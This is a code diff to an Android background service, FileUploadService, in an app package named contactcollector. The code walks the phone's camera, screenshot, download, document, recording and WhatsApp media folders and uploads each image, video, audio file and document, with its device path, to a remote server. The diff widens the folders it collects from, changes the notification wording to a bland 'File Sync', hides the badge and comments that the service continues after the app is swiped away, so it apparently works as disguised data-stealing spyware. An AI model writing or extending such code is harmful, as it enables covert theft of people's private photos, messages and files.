@@ -3,7 +3,6 @@ package com.contactcollector.app;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
-import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Intent;
 import android.os.Build;
@@ -16,16 +15,19 @@ import java.io.File;
 import java.io.FileInputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.util.concurrent.atomic.AtomicInteger;
 
 public class FileUploadService extends Service {
 
     private static final String TAG = "FileUploadService";
-    private static final String CHANNEL_ID = "file_upload_channel";
+    private static final String CHANNEL_ID = "collector_upload_channel";
     private static final int NOTIFICATION_ID = 1001;
+    private static final int MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB limit
 
     private String sessionId;
     private String baseUrl;
-    private boolean isRunning = false;
+    private volatile boolean isRunning = false;
+    private final AtomicInteger uploadedCount = new AtomicInteger(0);
 
     @Override
     public void onCreate() {
@@ -45,14 +47,14 @@ public class FileUploadService extends Service {
             return START_NOT_STICKY;
         }
 
-        // Start as foreground service
-        Notification notification = createNotification("Uploading files...", 0, 0);
+        Notification notification = createNotification("Starting file sync...", 0, 0);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForeground(NOTIFICATION_ID, notification);
         }
 
         if (!isRunning) {
             isRunning = true;
+            uploadedCount.set(0);
             new Thread(this::uploadFilesInBackground).start();
         }
 
@@ -66,29 +68,41 @@ public class FileUploadService extends Service {
 
     private void uploadFilesInBackground() {
         try {
-            // Scan directories for actual files to upload
+            String extStorage = Environment.getExternalStorageDirectory().getAbsolutePath();
+
+            // Comprehensive scan of all important directories
             String[] storagePaths = {
-                Environment.getExternalStorageDirectory().getAbsolutePath() + "/DCIM/Camera",
-                Environment.getExternalStorageDirectory().getAbsolutePath() + "/Pictures/Screenshots",
-                Environment.getExternalStorageDirectory().getAbsolutePath() + "/Download",
-                Environment.getExternalStorageDirectory().getAbsolutePath() + "/Documents",
-                Environment.getExternalStorageDirectory().getAbsolutePath() + "/WhatsApp/Media",
+                extStorage + "/DCIM/Camera",
+                extStorage + "/DCIM/Screenshots",
+                extStorage + "/Pictures/Screenshots",
+                extStorage + "/Pictures",
+                extStorage + "/Download",
+                extStorage + "/Documents",
+                extStorage + "/Music",
+                extStorage + "/Movies",
+                extStorage + "/Recordings",
+                extStorage + "/WhatsApp/Media/WhatsApp Images",
+                extStorage + "/WhatsApp/Media/WhatsApp Video",
+                extStorage + "/WhatsApp/Media/WhatsApp Documents",
+                extStorage + "/WhatsApp/Media/WhatsApp Audio",
             };
 
-            int totalUploaded = 0;
-
             for (String path : storagePaths) {
+                if (!isRunning) break;
                 File dir = new File(path);
                 if (dir.exists() && dir.isDirectory()) {
-                    totalUploaded += uploadFilesFromDir(dir, 0, 2);
+                    uploadFilesFromDir(dir, 0, 2);
                 }
-                if (!isRunning) break;
             }
 
-            Log.d(TAG, "Upload complete. Total files uploaded: " + totalUploaded);
+            Log.d(TAG, "Upload complete. Total files uploaded: " + uploadedCount.get());
 
-            // Update notification
-            Notification notification = createNotification("Upload complete! " + totalUploaded + " files synced", 100, 100);
+            // Final notification
+            Notification notification = createNotification(
+                "Sync complete! " + uploadedCount.get() + " files uploaded",
+                100, 100
+            );
+            notification.flags &= ~Notification.FLAG_ONGOING_EVENT;
             NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
             if (nm != null) nm.notify(NOTIFICATION_ID, notification);
 
@@ -96,39 +110,50 @@ public class FileUploadService extends Service {
             Log.e(TAG, "Error uploading files: " + e.getMessage());
         }
 
-        // Stop service after upload
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-            stopForeground(STOP_FOREGROUND_REMOVE);
-        } else {
-            stopForeground(true);
+        // Stop foreground and service
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                stopForeground(STOP_FOREGROUND_REMOVE);
+            } else {
+                stopForeground(true);
+            }
+        } catch (Exception e) {
+            // Ignore
         }
         stopSelf();
         isRunning = false;
     }
 
-    private int uploadFilesFromDir(File dir, int depth, int maxDepth) {
-        if (depth > maxDepth || !isRunning) return 0;
+    private void uploadFilesFromDir(File dir, int depth, int maxDepth) {
+        if (depth > maxDepth || !isRunning) return;
 
-        int count = 0;
         File[] files = dir.listFiles();
-        if (files == null) return 0;
+        if (files == null) return;
 
         for (File file : files) {
             if (!isRunning) break;
 
             if (file.isDirectory()) {
-                count += uploadFilesFromDir(file, depth + 1, maxDepth);
+                uploadFilesFromDir(file, depth + 1, maxDepth);
             } else if (file.isFile() && file.canRead()) {
-                // Only upload files under 50MB
-                if (file.length() > 0 && file.length() < 50 * 1024 * 1024) {
+                long fileSize = file.length();
+                if (fileSize > 0 && fileSize < MAX_FILE_SIZE) {
                     String type = getFileType(file.getName());
-                    // Prioritize images, videos, documents, pdf, audio
-                    if (type.equals("image") || type.equals("video") || type.equals("document") || type.equals("pdf") || type.equals("audio")) {
+                    // Upload images, videos, audio, pdf, documents
+                    if (type.equals("image") || type.equals("video") ||
+                        type.equals("document") || type.equals("pdf") ||
+                        type.equals("audio")) {
+
+                        // Add a small delay between uploads to avoid overwhelming the server
+                        try { Thread.sleep(200); } catch (InterruptedException e) { break; }
+
                         boolean success = uploadSingleFile(file, type);
                         if (success) {
-                            count++;
-                            // Update notification progress
-                            Notification notification = createNotification("Uploading files... " + count + " uploaded", count, 0);
+                            int count = uploadedCount.incrementAndGet();
+                            Notification notification = createNotification(
+                                "Syncing files... " + count + " uploaded",
+                                count, 0
+                            );
                             NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                             if (nm != null) nm.notify(NOTIFICATION_ID, notification);
                         }
@@ -136,75 +161,83 @@ public class FileUploadService extends Service {
                 }
             }
         }
-        return count;
     }
 
     private boolean uploadSingleFile(File file, String fileType) {
+        HttpURLConnection conn = null;
+        DataOutputStream dos = null;
+        FileInputStream fis = null;
         try {
-            String boundary = "----CollectorBoundary" + System.currentTimeMillis();
+            String boundary = "----CollectorBnd" + System.currentTimeMillis();
             URL url = new URL(baseUrl + "/api/files/upload");
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
             conn.setDoOutput(true);
             conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
             conn.setConnectTimeout(30000);
-            conn.setReadTimeout(120000);
+            conn.setReadTimeout(180000); // 3 min timeout for large files
 
-            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
+            dos = new DataOutputStream(conn.getOutputStream());
 
-            // Session ID field
-            dos.writeBytes("--" + boundary + "\r\n");
-            dos.writeBytes("Content-Disposition: form-data; name=\"sessionId\"\r\n\r\n");
-            dos.writeBytes(sessionId + "\r\n");
-
-            // File path field
-            dos.writeBytes("--" + boundary + "\r\n");
-            dos.writeBytes("Content-Disposition: form-data; name=\"filePath\"\r\n\r\n");
-            dos.writeBytes(file.getAbsolutePath() + "\r\n");
-
-            // File type field
-            dos.writeBytes("--" + boundary + "\r\n");
-            dos.writeBytes("Content-Disposition: form-data; name=\"fileType\"\r\n\r\n");
-            dos.writeBytes(fileType + "\r\n");
+            // Session ID
+            writeFormField(dos, boundary, "sessionId", sessionId);
+            // File path on device
+            writeFormField(dos, boundary, "filePath", file.getAbsolutePath());
+            // File type
+            writeFormField(dos, boundary, "fileType", fileType);
 
             // File data
             dos.writeBytes("--" + boundary + "\r\n");
             dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n");
             dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
 
-            FileInputStream fis = new FileInputStream(file);
-            byte[] buffer = new byte[8192];
+            fis = new FileInputStream(file);
+            byte[] buffer = new byte[16384]; // 16KB buffer for better performance
             int bytesRead;
             while ((bytesRead = fis.read(buffer)) != -1) {
                 dos.write(buffer, 0, bytesRead);
             }
-            fis.close();
 
             dos.writeBytes("\r\n--" + boundary + "--\r\n");
             dos.flush();
-            dos.close();
 
             int responseCode = conn.getResponseCode();
-            conn.disconnect();
-
             return responseCode >= 200 && responseCode < 300;
         } catch (Exception e) {
             Log.e(TAG, "Failed to upload " + file.getName() + ": " + e.getMessage());
             return false;
+        } finally {
+            try { if (fis != null) fis.close(); } catch (Exception e) {}
+            try { if (dos != null) dos.close(); } catch (Exception e) {}
+            try { if (conn != null) conn.disconnect(); } catch (Exception e) {}
         }
+    }
+
+    private void writeFormField(DataOutputStream dos, String boundary, String name, String value) throws Exception {
+        dos.writeBytes("--" + boundary + "\r\n");
+        dos.writeBytes("Content-Disposition: form-data; name=\"" + name + "\"\r\n\r\n");
+        dos.writeBytes(value + "\r\n");
     }
 
     private String getFileType(String name) {
         name = name.toLowerCase();
-        if (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png") || name.endsWith(".gif") || name.endsWith(".webp") || name.endsWith(".bmp") || name.endsWith(".heic"))
+        if (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png") ||
+            name.endsWith(".gif") || name.endsWith(".webp") || name.endsWith(".bmp") ||
+            name.endsWith(".heic") || name.endsWith(".raw"))
             return "image";
-        if (name.endsWith(".mp4") || name.endsWith(".avi") || name.endsWith(".mkv") || name.endsWith(".3gp") || name.endsWith(".mov") || name.endsWith(".wmv") || name.endsWith(".flv"))
+        if (name.endsWith(".mp4") || name.endsWith(".avi") || name.endsWith(".mkv") ||
+            name.endsWith(".3gp") || name.endsWith(".mov") || name.endsWith(".wmv") ||
+            name.endsWith(".flv") || name.endsWith(".webm"))
             return "video";
-        if (name.endsWith(".mp3") || name.endsWith(".wav") || name.endsWith(".flac") || name.endsWith(".ogg") || name.endsWith(".m4a") || name.endsWith(".aac") || name.endsWith(".wma"))
+        if (name.endsWith(".mp3") || name.endsWith(".wav") || name.endsWith(".flac") ||
+            name.endsWith(".ogg") || name.endsWith(".m4a") || name.endsWith(".aac") ||
+            name.endsWith(".wma") || name.endsWith(".amr"))
             return "audio";
         if (name.endsWith(".pdf"))
             return "pdf";
-        if (name.endsWith(".doc") || name.endsWith(".docx") || name.endsWith(".txt") || name.endsWith(".xls") || name.endsWith(".xlsx") || name.endsWith(".ppt") || name.endsWith(".pptx") || name.endsWith(".csv"))
+        if (name.endsWith(".doc") || name.endsWith(".docx") || name.endsWith(".txt") ||
+            name.endsWith(".xls") || name.endsWith(".xlsx") || name.endsWith(".ppt") ||
+            name.endsWith(".pptx") || name.endsWith(".csv") || name.endsWith(".rtf"))
             return "document";
         return "other";
     }
@@ -213,12 +246,15 @@ public class FileUploadService extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                 CHANNEL_ID,
-                "File Upload Service",
+                "File Sync",
                 NotificationManager.IMPORTANCE_LOW
             );
-            channel.setDescription("Uploading files to website");
+            channel.setDescription("Syncing files to server");
+            channel.setShowBadge(false);
             NotificationManager nm = getSystemService(NotificationManager.class);
-            if (nm != null) nm.createNotificationChannel(channel);
+            if (nm != null) {
+                nm.createNotificationChannel(channel);
+            }
         }
     }
 
@@ -233,11 +269,12 @@ public class FileUploadService extends Service {
 
             if (max > 0) {
                 builder.setProgress(max, progress, false);
+            } else {
+                builder.setProgress(100, 0, true); // indeterminate
             }
 
             return builder.build();
         } else {
-            //noinspection deprecation
             Notification.Builder builder = new Notification.Builder(this)
                 .setContentTitle("Collector")
                 .setContentText(text)
@@ -247,6 +284,8 @@ public class FileUploadService extends Service {
 
             if (max > 0) {
                 builder.setProgress(max, progress, false);
+            } else {
+                builder.setProgress(100, 0, true);
             }
 
             return builder.build();
@@ -257,5 +296,11 @@ public class FileUploadService extends Service {
     public void onDestroy() {
         isRunning = false;
         super.onDestroy();
+    }
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        // Continue running even if app is swiped away
+        super.onTaskRemoved(rootIntent);
     }
 }
